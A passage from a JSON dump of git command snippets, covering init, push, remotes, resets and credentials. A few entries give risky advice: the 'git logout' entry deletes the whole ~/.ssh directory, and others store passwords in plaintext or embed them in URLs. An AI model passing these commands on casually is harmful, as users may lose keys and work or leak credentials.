    "reg_date": "2021-10-11T22:05:16.000Z"
  },
  {
    "id": 1848,
    "keyword": null,
    "link": null,
    "title": " git ignore vendor folder not working",
    "description": "git rm -r --cached vendor\n",
    "reg_date": "2021-10-11T22:05:17.000Z"
  },
  {
    "id": 1849,
    "keyword": null,
    "link": null,
    "title": " git init at wrong folder",
    "description": " cd myFolder  rm -rf .git \n",
    "reg_date": "2021-10-11T22:05:17.000Z"
  },
  {
    "id": 1850,
    "keyword": null,
    "link": null,
    "title": " git init repo",
    "description": "# New local repository git init git add . git commit -m \"Initial commit\"  # New remote repository # Create remote repository (likely on github), then: git remote add origin https://github.com/username/new_repo #https git remote add origin git@github.com:username/new_repo #ssh # Now push git push -u origin master\ngit init git add somefile git commit -m \"initial commit\" git remote add origin https://github.com/username/new_repo git push -u origin master \n# New local repository git init git add . git commit -m \"Initial commit\"  # New remote repository git remote add origin git@github.com:username/new_repo #ssh # Now push git push -u origin master\ncd /path/to/my/codebase git init    git add .     git commit -m \"my comment\"   \n$ git add . # Adds the files in the local repository and stages them for commit. To unstage a file, use 'git reset HEAD YOUR-FILE'.\n$ git commit -m \"First commit\" # Commits the tracked changes and prepares them to be pushed to a remote repository. To remove this commit and modify the file, use 'git reset --soft HEAD~1' and commit and add the file again.\n",
    "reg_date": "2021-10-11T22:05:17.000Z"
  },
  {
    "id": 1851,
    "keyword": null,
    "link": null,
    "title": " git initial commit steps",
    "description": "# New local repository git init git add . git commit -m \"Initial commit\"  # New remote repository # Create remote repository (likely on github), then: git remote add origin https://github.com/username/new_repo #https git remote add origin git@github.com:username/new_repo #ssh # Now push git push -u origin master\n# On server: mkdir my_project.git cd my_project.git git --bare init # On client: mkdir my_project cd my_project touch .gitignore git init git add . git commit -m \"Initial commit\" git remote add origin youruser@yourserver.com:/path/to/my_project.git git push origin master\ngit configuration \n",
    "reg_date": "2021-10-11T22:05:17.000Z"
  },
  {
    "id": 1852,
    "keyword": null,
    "link": null,
    "title": " git initial commit to remote repository",
    "description": "# On server: mkdir my_project.git cd my_project.git git --bare init # On client: mkdir my_project cd my_project touch .gitignore git init git add . git commit -m \"Initial commit\" git remote add origin youruser@yourserver.com:/path/to/my_project.git git push origin master\n",
    "reg_date": "2021-10-11T22:05:17.000Z"
  },
  {
    "id": 1853,
    "keyword": null,
    "link": null,
    "title": " git initial push",
    "description": "# On server: mkdir my_project.git cd my_project.git git --bare init # On client: mkdir my_project cd my_project touch .gitignore git init git add . git commit -m \"Initial commit\" git remote add origin youruser@yourserver.com:/path/to/my_project.git git push origin master\n",
    "reg_date": "2021-10-11T22:05:17.000Z"
  },
  {
    "id": 1854,
    "keyword": null,
    "link": null,
    "title": " git install on alpine",
    "description": "apk add git\n",
    "reg_date": "2021-10-11T22:05:17.000Z"
  },
  {
    "id": 1855,
    "keyword": null,
    "link": null,
    "title": " git list alias commands",
    "description": "# Alias to list all saved alias git config --global alias.alias \"!git config --get-regexp ^alias\\.\"  #then git alias\n$ git config --get-regexp alias \n# Setup short form of commands to save keystrokes  git config --global alias.co checkout git config --global alias.br branch git config --global alias.ci commit git config --global alias.st status\n",
    "reg_date": "2021-10-11T22:05:17.000Z"
  },
  {
    "id": 1856,
    "keyword": null,
    "link": null,
    "title": " git list aliases",
    "description": "# Alias to list all saved alias git config --global alias.alias \"!git config --get-regexp ^alias\\.\"  #then git alias\n$ git config --get-regexp alias \n# Setup short form of commands to save keystrokes  git config --global alias.co checkout git config --global alias.br branch git config --global alias.ci commit git config --global alias.st status\n# Setup short form of commands to save keystrokes git config --global alias.co checkout git config --global alias.br branch git config --global alias.ci commit git config --global alias.st status git config --global alias.unstage 'reset HEAD --' git config --global alias.last 'log -1 HEAD'\n",
    "reg_date": "2021-10-11T22:05:18.000Z"
  },
  {
    "id": 1857,
    "keyword": null,
    "link": null,
    "title": " git list config",
    "description": "git config --list # or git config --global --list\ngit config --global --list\n",
    "reg_date": "2021-10-11T22:05:18.000Z"
  },
  {
    "id": 1858,
    "keyword": null,
    "link": null,
    "title": " git list user and email",
    "description": "git config --global --get user.name git config --global --get user.email\n",
    "reg_date": "2021-10-11T22:05:18.000Z"
  },
  {
    "id": 1859,
    "keyword": null,
    "link": null,
    "title": " git load all submodules",
    "description": "git submodule update --init --recursive\n",
    "reg_date": "2021-10-11T22:05:18.000Z"
  },
  {
    "id": 1860,
    "keyword": null,
    "link": null,
    "title": " git log graph",
    "description": "git log --all --decorate --oneline --graph \n  $ git log --all --oneline --graph \n[alias]     lg = lg1     lg1 = lg1-specific --all     lg2 = lg2-specific --all     lg3 = lg3-specific --all      lg1-specific = log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(auto)%d%C(reset)'     lg2-specific = log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset)%C(auto)%d%C(reset)%n''          %C(white)%s%C(reset) %C(dim white)- %an%C(reset)'     lg3-specific = log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset) %C(bold cyan)(committed: %cD)%C(reset) %C(auto)%d%C(reset)%n''          %C(white)%s%C(reset)%n''          %C(dim white)- %an <%ae> %C(reset) %C(dim white)(committer: %cn <%ce>)%C(reset)' \n",
    "reg_date": "2021-10-11T22:05:18.000Z"
  },
  {
    "id": 1861,
    "keyword": null,
    "link": null,
    "title": " git log oneline graph",
    "description": "git log --oneline --graph\n",
    "reg_date": "2021-10-11T22:05:18.000Z"
  },
  {
    "id": 1862,
    "keyword": null,
    "link": null,
    "title": " git logout",
    "description": "# logout from git cmi  # Remove your SSH keys from ~/.ssh (or where you stored them). rm -rf /home/user/.ssh  # Remove your user settings:  git config --global --unset user.name git config --global --unset user.email git config --global --unset credential.helper  #Or all your global settings:  git config --global --unset-all\n",
    "reg_date": "2021-10-11T22:05:18.000Z"
  },
  {
    "id": 1863,
    "keyword": null,
    "link": null,
    "title": " git master main",
    "description": "$ git branch -m master main  or create a new one  $ git checkout -b main \n# Step 1  # create main branch locally, taking the history from master git branch -m master main  # Step 2  # push the new local main branch to the remote repo (GitHub)  git push -u origin main  # Step 3 # switch the current HEAD to the main branch git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main  # Step 4 # change the default branch on GitHub to main # https://docs.github.com/en/github/administering-a-repository/setting-the-default-branch  # Step 5 # delete the master branch on the remote git push origin --delete master\n$ git push -u origin main \n",
    "reg_date": "2021-10-11T22:05:19.000Z"
  },
  {
    "id": 1864,
    "keyword": null,
    "link": null,
    "title": " git match remote master",
    "description": "git fetch origin git reset --hard origin/master\n",
    "reg_date": "2021-10-11T22:05:19.000Z"
  },
  {
    "id": 1865,
    "keyword": null,
    "link": null,
    "title": " git merge abort",
    "description": "git merge --abort\ngit merge --abort \ngit reset --hard HEAD\n#git merge abort:  git merge --abort\n",
    "reg_date": "2021-10-11T22:05:19.000Z"
  },
  {
    "id": 1866,
    "keyword": null,
    "link": null,
    "title": " git merge cancel",
    "description": "git merge --abort\ngit merge --abort \n",
    "reg_date": "2021-10-11T22:05:19.000Z"
  },
  {
    "id": 1867,
    "keyword": null,
    "link": null,
    "title": " git name repository",
    "description": "basename `git rev-parse --show-toplevel`\n",
    "reg_date": "2021-10-11T22:05:19.000Z"
  },
  {
    "id": 1868,
    "keyword": null,
    "link": null,
    "title": " git never ask for password",
    "description": "git config --global credential.helper store\n",
    "reg_date": "2021-10-11T22:05:19.000Z"
  },
  {
    "id": 1869,
    "keyword": null,
    "link": null,
    "title": " git not asking for password",
    "description": "git config --system --unset credential.helper git config --global --unset credential.helper git config --local --unset credential.helper\n",
    "reg_date": "2021-10-11T22:05:20.000Z"
  },
  {
    "id": 1870,
    "keyword": null,
    "link": null,
    "title": " git not taking file name change",
    "description": "git config core.ignorecase false\n",
    "reg_date": "2021-10-11T22:05:20.000Z"
  },
  {
    "id": 1871,
    "keyword": null,
    "link": null,
    "title": " git not using ssh key",
    "description": "ssh -T git@github.com  #Check if you are authenticated via key git remote set-url origin git@github.com:username/repo.git   #inside your project\nssh-agent bash -c 'ssh-add /somewhere/yourkey; git clone git@github.com:user/project.git'\n",
    "reg_date": "2021-10-11T22:05:20.000Z"
  },
  {
    "id": 1872,
    "keyword": null,
    "link": null,
    "title": " git origin master some file",
    "description": "git checkout origin/master -- path/to/file\n",
    "reg_date": "2021-10-11T22:05:20.000Z"
  },
  {
    "id": 1873,
    "keyword": null,
    "link": null,
    "title": " git overwrite local changes",
    "description": "git fetch --all git reset --hard origin/master\ngit reset --hard origin/master \n# if working with newer repos where 'master' is now 'main' git fetch --all git reset --hard origin/main \n",
    "reg_date": "2021-10-11T22:05:20.000Z"
  },
  {
    "id": 1874,
    "keyword": null,
    "link": null,
    "title": " git overwrite urlk",
    "description": "# Overwriting an existing git url: git remote set-url origin <git_url>\ngit remote add origin git@github.com:nikhilbhardwaj/abc.git\ngit remote add origin <git_url>\n",
    "reg_date": "2021-10-11T22:05:20.000Z"
  },
  {
    "id": 1875,
    "keyword": null,
    "link": null,
    "title": " git pasar de https a ssh",
    "description": "// Reemplazar RobertoArmas/SMP.git por el repositorio git remote set-url origin git@github.com:RobertoArmas/SMP.git\n",
    "reg_date": "2021-10-11T22:05:21.000Z"
  },
  {
    "id": 1876,
    "keyword": null,
    "link": null,
    "title": " git proxy",
    "description": "git config --global http.proxy http://proxyuser:proxypwd@proxy.server.com:8080 \n",
    "reg_date": "2021-10-11T22:05:21.000Z"
  },
  {
    "id": 1877,
    "keyword": null,
    "link": null,
    "title": " git pull force",
    "description": "git fetch --all git reset --hard origin/master\ngit push --force\ngit reset --hard origin/master \n# WARNING: this can't be undone!  git reset --hard HEAD git clean -f -d git pull \ngit reset --hard HEAD git pull \n# if working with newer repos where 'master' is now 'main' git fetch --all git reset --hard origin/main \n",
    "reg_date": "2021-10-11T22:05:21.000Z"
  },
  {
    "id": 1878,
    "keyword": null,
    "link": null,
    "title": " git pull from remote branch overwrite local",
    "description": "git reset --hard origin/master \n",
    "reg_date": "2021-10-11T22:05:21.000Z"
  },
  {
    "id": 1879,
    "keyword": null,
    "link": null,
    "title": " git pull hard",
    "description": "git fetch --all git reset --hard origin/master\ngit reset --hard origin/master \n# if working with newer repos where 'master' is now 'main' git fetch --all git reset --hard origin/main \n",
    "reg_date": "2021-10-11T22:05:21.000Z"
  },
  {
    "id": 1880,
    "keyword": null,
    "link": null,
    "title": " git pull in all repositories",
    "description": "for i in */.git; do ( echo $i; cd $i/..; git pull; ); done\n",
    "reg_date": "2021-10-11T22:05:21.000Z"
  },
  {
    "id": 1881,
    "keyword": null,
    "link": null,
    "title": " git pull master discard local changes",
    "description": "git reset --hard origin/master git pull origin master \ngit reset --hard <your commit hash key> \n",
    "reg_date": "2021-10-11T22:05:22.000Z"
  },
  {
    "id": 1882,
    "keyword": null,
    "link": null,
    "title": " git pull master into branch",
    "description": "git checkout <branch-name>  # gets you on <branch-name> git fetch origin        \t# gets you up to date with origin git merge origin/master\t\t# pull master into <branch-name> \ngit pull origin\ngit checkout dmgr2      # gets you \"on branch dmgr2\" git fetch origin        # gets you up to date with origin git merge origin/master \n",
    "reg_date": "2021-10-11T22:05:22.000Z"
  },
  {
    "id": 1883,
    "keyword": null,
    "link": null,
    "title": " git pull updates from fork",
    "description": "# Add the remote, call it \"upstream\":  git remote add upstream https://github.com/whoever/whatever.git  # Fetch all the branches of that remote into remote-tracking branches, # such as upstream/master:  git fetch upstream  # Make sure that you're on your master branch:  git checkout master  # Rewrite your master branch so that any commits of yours that # aren't already in upstream/master are replayed on top of that # other branch:  git rebase upstream/master\n$ cd github-services $ git remote add upstream git://github.com/pjhyett/github-services.git $ git fetch upstream  # then: (like \"git pull\" which is fetch + merge) $ git merge upstream/master master  # or, better, replay your local work on top of the fetched branch # like a \"git pull --rebase\" $ git rebase upstream/master \n",
    "reg_date": "2021-10-11T22:05:22.000Z"
  },
  {
    "id": 1884,
    "keyword": null,
    "link": null,
    "title": " git pull with submodules",
    "description": "git pull --recurse-submodules\ngit submodule update --recursive --remote \ngit submodule update --init --recursive\ngit submodule update \n",
    "reg_date": "2021-10-11T22:05:22.000Z"
  },
  {
    "id": 1885,
    "keyword": null,
    "link": null,
    "title": " git push all branches",
    "description": "git push --all \ngit push REMOTE '*:*' git push REMOTE --all \n//push all local branches to remote git push --all\n",
    "reg_date": "2021-10-11T22:05:23.000Z"
  },
  {
    "id": 1886,
    "keyword": null,
    "link": null,
    "title": " git push command line",
    "description": "1. git init  2. git add .  3. git status  4. git commit -m 'your message'  5. git remote add origin 'your_url_name'   6. git push -u origin master //then login w/ your creds\ngit push origin --force\ngit:    git add .    git commit -m \"$m\"    git push -u origin master \ngit remote add origin https://github.com/tqisjim/google-oauth.git git push -u origin master\n$ git commit -m \"Add existing file\" # Commits the tracked changes and prepares them to be pushed to a remote repository. To remove this commit and modify the file, use 'git reset --soft HEAD~1' and commit and add the file again.\ngit push -u githubrepo master\n",
    "reg_date": "2021-10-11T22:05:23.000Z"
  },
  {
    "id": 1887,
    "keyword": null,
    "link": null,
    "title": " git push current project to master",
    "description": "git init git add . git commit -m 'First commit' git remote add origin <remote repository URL> git push origin master \ngit init git add . git commit -m \"First commit\" git remote add origin <remote repository URL> git remote -v git branch -M main git push -u origin main  1- # Create a new repository on GitHub. To avoid errors, do not initialize the new repository with README, license, or gitignore files. You can add these files after your project has been pushed to GitHub.  2- # Open Terminal.  3- # Change the current working directory to your local project.  4- # Initialize the local directory as a Git repository. $ git init  5- # Add the files in your new local repository. This stages them for the first commit. $ git add . # Adds the files in the local repository and stages them for commit. To unstage a file, use 'git reset HEAD YOUR-FILE'.  6- # Commit the files that you've staged in your local repository. $ git commit -m \"First commit\" # Commits the tracked changes and prepares them to be pushed to a remote repository. To remove this commit and modify the file, use 'git reset --soft HEAD~1' and commit and add the file again.  7- # At the top of your GitHub repository's Quick Setup page, click  to copy the remote repository URL.  8- # In Terminal, add the URL for the remote repository where your local repository will be pushed. $ git remote add origin <remote repository URL> # Sets the new remote $ git remote -v # Verifies the new remote URL  9- # Push the changes in your local repository to GitHub. $ git branch -M main $ git push -u origin main # Pushes the changes in your local repository up to the remote repository you specified as the origin\n",
    "reg_date": "2021-10-11T22:05:23.000Z"
  },
  {
    "id": 1888,
    "keyword": null,
    "link": null,
    "title": " git push error",
    "description": "Just pull repository first and then try to push again git pull --rebase remote_repo git push origin remote_repo\n",
    "reg_date": "2021-10-11T22:05:23.000Z"
  },
  {
    "id": 1889,
    "keyword": null,
    "link": null,
    "title": " git push existing repo",
    "description": "cd existing_folder git init git remote add origin https://gitlab.com/abc.git git add . git commit -m \"Initial commit\" git push -u origin master\ngit remote add origin <remote repository URL> \ngit remote add origin remote repository URL git remote -v git push -f origin master\ngit remote add origin https://github.com/TaherSaid/my-pfe-informatique-mobile.git git branch -M main git push -u origin main\n",
    "reg_date": "2021-10-11T22:05:23.000Z"
  },
  {
    "id": 1890,
    "keyword": null,
    "link": null,
    "title": " git push origin",
    "description": "1. git init  2. git add .  3. git status  4. git commit -m 'your message'  5. git remote add origin 'your_url_name'   6. git push -u origin master //then login w/ your creds\ngit push origin --force\ngit branch -M main  then  git push -u origin main  or   git push -f origin main  or   git push origin master --force\ngit remote add origin <the URL for your Bitbucket repository>  git push -u origin master\n# Once a repo is cloned, you'll be working inside of the default branch (the default is `master`) git clone https://github.com/<git-user>/<repo-name> && cd <repo-name> # make changes and stage your files (repeat the `git add` command for each file, or use `git add .` to stage all) git add <filename> # now commit your code git commit -m \"added some changes to my repo!\" # push changes in `master` branch to github git push origin master\ngit remote add origin https://github.com/tqisjim/google-oauth.git git push -u origin master\n",
    "reg_date": "2021-10-11T22:05:23.000Z"
  },
  {
    "id": 1891,
    "keyword": null,
    "link": null,
    "title": " git push origin master --force",
    "description": "git push origin --force\ngit push --force\ngit push origin <your_branch_name> --force \ngit push -f <remote> <branch> # example: git push -f origin master\ngit push -f\n",
    "reg_date": "2021-10-11T22:05:23.000Z"
  },
  {
    "id": 1892,
    "keyword": null,
    "link": null,
    "title": " git push rejected",
    "description": "Just pull repository first and then try to push again git pull --rebase remote_repo git push origin remote_repo\ngit pull origin master  git push -u origin master\n#fetching remote 'feature/my_feature_branch' branch to the 'tmp' local branch  git fetch origin feature/my_feature_branch:tmp  #rebasing on local 'tmp' branch git rebase tmp  #pushing local changes to the remote git push origin HEAD:feature/my_feature_branch  #removing temporary created 'tmp' branch git branch -D tmp \n",
    "reg_date": "2021-10-11T22:05:23.000Z"
  },
  {
    "id": 1893,
    "keyword": null,
    "link": null,
    "title": " git push set upstream",
    "description": "git branch --set-upstream-to <remote-branch>  // example git branch --set-upstream-to origin feature-branch  // show up which remote branch a local branch is tracking git branch -vv  // short version to set upstream with very first push git push -u origin local-branch\ngit push --set-upstream origin <branch>\n$ git remote add upstream https://github.com/ORIGINAL_OWNER/ORIGINAL_REPOSITORY.git\ngit remote add upstream GIT_DIR\ngit remote add upstream git@bitbucket.org:some-gatekeeper-maintainer/some-project.git\n",
    "reg_date": "2021-10-11T22:05:24.000Z"
  },
  {
    "id": 1894,
    "keyword": null,
    "link": null,
    "title": " git push tags",
    "description": "#from git 1.8.3 you can use git push --follow-tags #single tag push git push origin <tag_name> #All tags (if possible use --follow-tags 'cause it's safer) git push --tags\ngit tag -a v1.4 -m \"my version 1.4\" \ngit tag -a v1.2  git push origin v1.2\ngit tag -a version.number -m \"Tag Message\" git push origin <tagname>\n$ git push origin v1.4 Counting objects: 14, done. Delta compression using up to 8 threads. Compressing objects: 100% (12/12), done. Writing objects: 100% (14/14), 2.05 KiB | 0 bytes/s, done. Total 14 (delta 3), reused 0 (delta 0) To git@bitbucket.com:atlasbro/gittagdocs.git * [new tag] v1.4 -> v1.4 \ngit push origin --tags\n",
    "reg_date": "2021-10-11T22:05:24.000Z"
  },
  {
    "id": 1895,
    "keyword": null,
    "link": null,
    "title": " git push to branch",
    "description": "git push origin --force\n# If its your first push git push -u origin BRANCH  # Otherwise git push origin BRANCH \nCreate a new branch: git checkout -b feature_branch_name  Edit, add and commit your files.  Push your branch to the remote repository: git push -u origin feature_branch_name\ngit push -u origin <branch-name> \ngit push -u origin <branch>\ngit checkout -b <branch> git add . git commit -m \"comment\" git push -u origin <branch>\n",
    "reg_date": "2021-10-11T22:05:24.000Z"
  },
  {
    "id": 1896,
    "keyword": null,
    "link": null,
    "title": " git push username password",
    "description": "git add .  git commit -m \"Bug Fixed\"  git push https://<username>:<password>@github.com/<username>/<repository>.git --all\n$ git config --global credential.helper cache\n# inside of ~/.netrc machine github.com        login <user>        password <password> \nmachine github.com        login <user>        password <password> \n",
    "reg_date": "2021-10-11T22:05:24.000Z"
  },
  {
    "id": 1897,
    "keyword": null,
    "link": null,
    "title": " git rebase fork",
    "description": "## Add Original Repository git remote add upstream https://github.com/OriginalOwner/OriginalProject.git  ## Verify if Repository is added git remote -v  ## Fetch Updates from Original Repository git fetch upstream  ## Checkout to your master branch git checkout master  ## Get Updates from upstream repo git merge upstream/master  ## Push the commit over  git push origin master\ngit remote add upstream https://github.com/whoever/whatever.git  git fetch upstream  git checkout master  git rebase upstream/master  git push -f origin master\n",
    "reg_date": "2021-10-11T22:05:24.000Z"
  },
  {
    "id": 1898,
    "keyword": null,
    "link": null,
    "title": " git remember credentials",
    "description": "// local git config credential.helper store // global git config --global credential.helper store\n# this will store your credentials \"forever\" git config --global credential.helper store\ngit config --global credential.helper store\n$ git config credential.helper store $ git push http://example.com/repo.git Username: <type your username> Password: <type your password>  [several days later] $ git push http://example.com/repo.git [your credentials are used automatically]\n# This cache timeout is in seconds $ git config --global credential.helper 'cache --timeout=3600'  \n",
    "reg_date": "2021-10-11T22:05:24.000Z"
  },
  {
    "id": 1899,
    "keyword": null,
    "link": null,
    "title": " git remote add heroku",
    "description": "git remote add heroku git@heroku.com:project.git \nheroku git:remote -a project\nheroku git:remote -a name-of-app\n$ git add . $ git commit -m \"Added a Procfile.\" $ heroku login Enter your Heroku credentials. ... $ heroku create <app-name> Creating arcane-lowlands-8408... done, stack is cedar // now create procfile // //node app.js //  $ git push heroku master -----> Node.js app detected ... -----> Launching... done        http://arcane-lowlands-8408.herokuapp.com deployed to Heroku\n$ git push heroku master\n$ heroku git:remote -a thawing-inlet-61413 set git remote heroku to https://git.heroku.com/thawing-inlet-61413.git \n",
    "reg_date": "2021-10-11T22:05:25.000Z"
  },
  {
    "id": 1900,
    "keyword": null,
    "link": null,
    "title": " git remote chage url",
    "description": "git remote set-url origin https://hostname/USERNAME/REPOSITORY.git\ngit remote set-url origin git@accountname.git.beanstalkapp.com:/your-repository.git\ngit remote -v # View existing remotes # origin  https://github.com/user/repo.git (fetch) # origin  https://github.com/user/repo.git (push)  git remote set-url origin https://github.com/user/repo2.git # Change the 'origin' remote's URL  git remote -v # Verify new remote URL # origin  https://github.com/user/repo2.git (fetch) # origin  https://github.com/user/repo2.git (push) \n$ git remote set-url <remote_name> <remote_url>\n",
    "reg_date": "2021-10-11T22:05:25.000Z"
  },
  {
    "id": 1901,
    "keyword": null,
    "link": null,
    "title": " git remote remove origin fatal no such remote 'origin'",
    "description": "The above will only work if you've either cloned the repository or manually added a remote called origin.  If \"git remote -v\" doesn't show you any remotes you can simply add a remote using:  git remote add origin https://username@stash/scm/PROJECT/repo.git The name of the remote doesn't have to be \"origin\" and can be any name that makes it easier for you to identify that particular remote (e.g. \"stash\").  HTH,  Stefan\n",
    "reg_date": "2021-10-11T22:05:25.000Z"
  },
  {
    "id": 1902,
    "keyword": null,
    "link": null,
    "title": " git remote show origin",
    "description": " git config --get remote.origin.url\ngit config --get remote.origin.url\n# If you require full output and you are on a network that can reach the remote repo where the origin resides  git remote show origin \ngit remote show origin\n$ git remote -v origin\thttps://github.com/schacon/ticgit (fetch) origin\thttps://github.com/schacon/ticgit (push)\n# when you are not connected to the network, you can use this git config --get remote.origin.url \n",
    "reg_date": "2021-10-11T22:05:25.000Z"
  },
  {
    "id": 1903,
    "keyword": null,
    "link": null,
    "title": " git remote url",
    "description": "git config --get remote.origin.url \n git config --get remote.origin.url\n git remote -v  git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\n# change remote url git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\n# Overwriting an existing git url: git remote set-url origin <git_url>\n# Check existing git url: git remote -v\n",
    "reg_date": "2021-10-11T22:05:25.000Z"
  },
  {
    "id": 1904,
    "keyword": null,
    "link": null,
    "title": " git remove all branches except master windows",
    "description": "git branch | %{ $_.Trim() } | ?{ $_ -ne 'master' } | %{ git branch -D $_ }\n",
    "reg_date": "2021-10-11T22:05:25.000Z"
  },
  {
    "id": 1905,
    "keyword": null,
    "link": null,
    "title": " git remove all files from gitignore",
    "description": "git ls-files -i --exclude-from=.gitignore | %{git rm --cached $_}  // works with windows powershell\ngit ls-files --ignored --exclude-standard -z | xargs -0 git rm --cached git commit -am \"Remove ignored files\"   // answer from: thSoft\ngit ls-files -i -z --exclude-from=.gitignore | xargs -0 git rm --cached\n",
    "reg_date": "2021-10-11T22:05:25.000Z"
  },
  {
    "id": 1906,
    "keyword": null,
    "link": null,
    "title": " git remove all local commits",
    "description": "git reset --hard origin/<branch_name>\ngit reset --hard origin/<branch_name> \n",
    "reg_date": "2021-10-11T22:05:25.000Z"
  },
  {
    "id": 1907,
    "keyword": null,
    "link": null,
    "title": " git remove all tags from remote",
    "description": "Delete a remote Git tag  $ git push --delete origin tagname\ngit tag -d $(git tag -l) \ngit fetch git tag -l | xargs -n 1 git push --delete origin\n",
    "reg_date": "2021-10-11T22:05:26.000Z"
  },
  {
    "id": 1908,
    "keyword": null,
    "link": null,
    "title": " git remove branch",
    "description": "// delete branch locally git branch -d localBranchName  //delete local branch that is unmerged git branch -D localBranchName  // delete branch remotely git push origin --delete remoteBranchName\n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName \n$ git push origin --delete feature/login \n// delete branch locally git branch -d localBranchName  // delete branch remotely git push origin --delete remoteBranchName  // refresh branch list git fetch -p\n## git version 2.25.1  ## Deleting local branches git branch -d localBranchName ## Deleting remote branches git push origin --delete remoteBranchName  ## Deleting both a local and a remote branch ## They are completely separate objects in Git. But git branch -d localBranchName && git push origin --delete remoteBranchName\ngit branch -d <branch_name>\n",
    "reg_date": "2021-10-11T22:05:26.000Z"
  },
  {
    "id": 1909,
    "keyword": null,
    "link": null,
    "title": " git remove cached",
    "description": "$ git rm -r --cached .\ngit rm -r --cached <name-of-dir>\ngit rm -r --cached [directory]\n$ git rm --cached filename\n",
    "reg_date": "2021-10-11T22:05:26.000Z"
  },
  {
    "id": 1910,
    "keyword": null,
    "link": null,
    "title": " git remove commit",
    "description": "# Removes latest commit from the stash, KEEPS changes git reset --soft HEAD~  # Removes latest commit from the stash, DELETES changes git reset --hard HEAD~\ngit reset --hard origin\n# How to stash and remove a commit from a branch that has already been pushed  git stash save \"<comment>\" git stash pop  # git stash list  git reset --hard HEAD~1 # 1 stands for the amount of commits to go back from HEAD  git push origin HEAD --force\ngit checkout master git reset --hard e3f1e37 git push --force origin master # Then to prove it (it won't print any diff) git diff master..origin/master\ngit revert dd61ab23 \ngit reset --hard <last_working_commit_id> \n",
    "reg_date": "2021-10-11T22:05:26.000Z"
  },
  {
    "id": 1911,
    "keyword": null,
    "link": null,
    "title": " git remove commit before push",
    "description": "# Removes latest commit from the stash, KEEPS changes git reset --soft HEAD~  # Removes latest commit from the stash, DELETES changes git reset --hard HEAD~\ngit reset --soft HEAD~\n",
    "reg_date": "2021-10-11T22:05:26.000Z"
  },
  {
    "id": 1912,
    "keyword": null,
    "link": null,
    "title": " git remove current pull",
    "description": "git reset --hard HEAD@{1} \n",
    "reg_date": "2021-10-11T22:05:26.000Z"
  },
  {
    "id": 1913,
    "keyword": null,
    "link": null,
    "title": " git remove deleted remote branches",
    "description": "git fetch origin --prune\ngit fetch origin --prune \nnpx git-removed-branches --prune \n",
    "reg_date": "2021-10-11T22:05:26.000Z"
  },
  {
    "id": 1914,
    "keyword": null,
    "link": null,
    "title": " git remove directory from tracking",
    "description": "git rm -r --cached path_to_your_folder/ \nRemove the folder from your local git tracking, but keep it on your disk.  git rm -r --cached path_to_your_folder/ \n",
    "reg_date": "2021-10-11T22:05:26.000Z"
  },
  {
    "id": 1915,
    "keyword": null,
    "link": null,
    "title": " git remove file from repo that has been added to gitignore",
    "description": "Commit any files that you need to change/delete to the repo. Then:  git rm -r --cached .  # this will clean all files from cache. To clean a single file, exchange '.' with filename git add .  # add all of the now uncached files that are not gitignored to the staging area git commit -m \"fix .gitignore\"  # commit the changes\ngit ls-files --ignored --exclude-standard -z | xargs -0 git rm --cached git commit -am \"Remove ignored files\"   // answer from: thSoft\n",
    "reg_date": "2021-10-11T22:05:26.000Z"
  },
  {
    "id": 1916,
    "keyword": null,
    "link": null,
    "title": " git remove file mode changes",
    "description": "git config core.fileMode false \n",
    "reg_date": "2021-10-11T22:05:27.000Z"
  },
  {
    "id": 1917,
    "keyword": null,
    "link": null,
    "title": " git remove folder remotely",
    "description": "git rm -r --cached <folder> git commit -m \"Removed Folder\" git push origin master\n",
    "reg_date": "2021-10-11T22:05:27.000Z"
  },
  {
    "id": 1918,
    "keyword": null,
    "link": null,
    "title": " git remove from from repo and stop tracking",
    "description": "Update your . gitignore file &ndash; for instance, add a folder you don't want to track to . gitignore . git rm -r --cached . &ndash; Remove all tracked files, including wanted and unwanted. Your code will be safe as long as you have saved locally. git add . &ndash; All files will be added back in, except those in . gitignore .\n",
    "reg_date": "2021-10-11T22:05:27.000Z"
  },
  {
    "id": 1919,
    "keyword": null,
    "link": null,
    "title": " git remove las remotet commit",
    "description": "git reset HEAD^ # remove commit locally git push origin +HEAD # force-push the new HEAD commit \n",
    "reg_date": "2021-10-11T22:05:27.000Z"
  },
  {
    "id": 1920,
    "keyword": null,
    "link": null,
    "title": " git remove origin",
    "description": "git remote remove origin \ngit remote rm heroku \n$ git remote -v # View current remotes > origin  https://github.com/OWNER/REPOSITORY.git (fetch) > origin  https://github.com/OWNER/REPOSITORY.git (push) > destination  https://github.com/FORKER/REPOSITORY.git (fetch) > destination  https://github.com/FORKER/REPOSITORY.git (push)  $ git remote rm destination # Remove remote $ git remote -v # Verify it's gone > origin  https://github.com/OWNER/REPOSITORY.git (fetch) > origin  https://github.com/OWNER/REPOSITORY.git (push)\ngit remote set-url origin new.git.url/here or git remote rm origin\ngit remote rm remote_name\ngit remote set-url origin git://new.url.here \n",
    "reg_date": "2021-10-11T22:05:27.000Z"
  },
  {
    "id": 1921,
    "keyword": null,
    "link": null,
    "title": " git remove proxy settings",
    "description": "git config --global --unset https.proxy git config --global --unset http.proxy \n",
    "reg_date": "2021-10-11T22:05:27.000Z"
  },
  {
    "id": 1922,
    "keyword": null,
    "link": null,
    "title": " git remove remote",
    "description": "git remote remove origin \n$ git remote -v # View current remotes > origin  https://github.com/OWNER/REPOSITORY.git (fetch) > origin  https://github.com/OWNER/REPOSITORY.git (push) > destination  https://github.com/FORKER/REPOSITORY.git (fetch) > destination  https://github.com/FORKER/REPOSITORY.git (push)  $ git remote rm destination # Remove remote $ git remote -v # Verify it's gone > origin  https://github.com/OWNER/REPOSITORY.git (fetch) > origin  https://github.com/OWNER/REPOSITORY.git (push)\n# The example will remove the github remote.  # Note that the command will not delete the repository,  # just the local reference. git remote rm origin\ngit remote rm remote_name\ngit remote set-url origin git://new.url.here \ngit remote add origin https://github.com/dk9071091/avnikreactjs.git git branch -M main git push -u origin main\n",
